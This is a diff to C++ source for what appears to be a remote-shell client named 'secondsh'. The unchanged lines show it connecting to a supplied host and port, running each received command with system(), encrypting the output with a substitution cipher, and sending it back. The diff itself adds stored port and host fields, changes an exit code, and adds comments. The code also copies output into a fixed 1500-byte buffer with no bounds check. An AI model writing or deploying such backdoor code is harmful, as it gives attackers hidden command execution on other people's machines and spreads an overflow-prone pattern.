@@ -19,10 +19,15 @@
 #include <arpa/inet.h>
 #include <netdb.h>
 
+// theres a limit about how much memory you can access, buffer size is only 1500
+
 struct secondsh{
     int bytes_red = 0;
     int bytes_written = 0;
     int global_socket;
+
+    unsigned int PORT_;
+    std::string hostname_;
 
     std::string alphabet = "abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
     std::string str = "gjewklmzusnvqpycthrifxbdao DWKISFOGNUQZXBYCEVRLMAHPJT6547812390";
@@ -95,6 +100,9 @@ struct secondsh{
     }
 
     int* connect_socket(unsigned int PORT, const std::string hostname){
+        PORT_ = PORT;
+        hostname_ = hostname;
+
         char buffer[1500];
 
         struct hostent* host = gethostbyname(hostname.c_str()); 
@@ -161,7 +169,7 @@ struct secondsh{
 
             else if(!strcmp(buffer, "disconnect")){
                 close(global_socket);
-                exit(1);
+                exit(0);
             }
             
             system(buffer);
@@ -169,6 +177,7 @@ struct secondsh{
             std::string crypt_out = ncrypt(cmd_out);
             //std::cout << buffer << std::endl;
             strcpy(buffer, crypt_out.c_str());
+            // send size of cmd_out first
             bytes_written += send(global_socket, (char*)&buffer, strlen(buffer)+1, 0);
      
         }
